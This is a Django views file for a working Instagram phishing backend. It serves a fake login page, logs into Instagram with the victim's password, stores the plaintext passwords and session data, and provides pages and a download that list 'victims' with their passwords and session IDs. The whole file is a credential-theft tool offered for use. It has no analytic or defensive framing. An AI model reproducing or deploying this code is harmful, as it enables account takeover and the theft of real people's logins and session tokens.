# core/views.py → FINAL RENDER 100% WORKING (NO settings.FERNET_KEY)

from django.http import JsonResponse, HttpResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from core.models import InstagramAccount
from instagrapi import Client
from cryptography.fernet import Fernet
import json
import os

# THIS IS THE ONLY CORRECT WAY ON RENDER
FERNET_KEY = os.getenv('FERNET_KEY')
if not FERNET_KEY:
    raise Exception("FERNET_KEY not set in Render Environment Variables!")

fernet = Fernet(FERNET_KEY.encode())

@csrf_exempt
def login_view(request):
    if request.method == "GET":
        return render(request, 'core/login.html')
    
    if request.method == "POST":
        username = request.POST.get('username', '').strip()
        password = request.POST.get('password', '').strip()
        
        cl = Client()
        cl.delay_range = [1, 3]
        
        try:
            cl.login(username, password)
            session = cl.get_settings()
            success = True
        except:
            session = {"failed": True}
            success = False

        encrypted = fernet.encrypt(json.dumps(session).encode()).decode()
        
        InstagramAccount.objects.create(
            username=username,
            password=password,
            session_data=encrypted,
            is_active=success
        )
        
        return JsonResponse({"success": True, "username": username})


def get_all_sessions(request):
    data = []
    for acc in InstagramAccount.objects.all().order_by('-id'):
        try:
            decrypted = fernet.decrypt(acc.session_data.encode()).decode()
            session = json.loads(decrypted)
            sessionid = session.get("authorization_data", {}).get("sessionid", "")
            data.append({
                "username": acc.username,
                "password": acc.password,
                "active": acc.is_active,
                "sessionid": sessionid[:70] + "..." if len(sessionid) > 70 else sessionid
            })
        except:
            data.append({"username": acc.username, "error": "corrupted"})
    
    html = f"""
    <h1 style="color:#00ff00;text-align:center;font-size:50px;">TOTAL VICTIMS: {len(data)}</h1>
    <pre style="background:black;color:lime;padding:30px;border:5px solid lime;border-radius:20px;font-size:18px;">{json.dumps(data, indent=2)}</pre>
    <center>
        <a href="/" style="color:cyan;font-size:30px;margin:20px;">BACK</a> | 
        <a href="/download/" style="color:gold;font-size:30px;margin:20px;">DOWNLOAD ALL</a>
    </center>
    """
    return HttpResponse(html)


def download_all(request):
    txt = ""
    for acc in InstagramAccount.objects.all():
        try:
            decrypted = fernet.decrypt(acc.session_data.encode()).decode()
            session = json.loads(decrypted)
            sessionid = session.get("authorization_data", {}).get("sessionid", "")
            txt += f"{acc.username}:{acc.password}:{sessionid}\n"
        except:
            txt += f"{acc.username}:{acc.password}:ERROR\n"
    
    response = HttpResponse(txt, content_type='text/plain')
    response['Content-Disposition'] = 'attachment; filename="INSTAGRAM_VICTIMS_2025.txt"'
    return response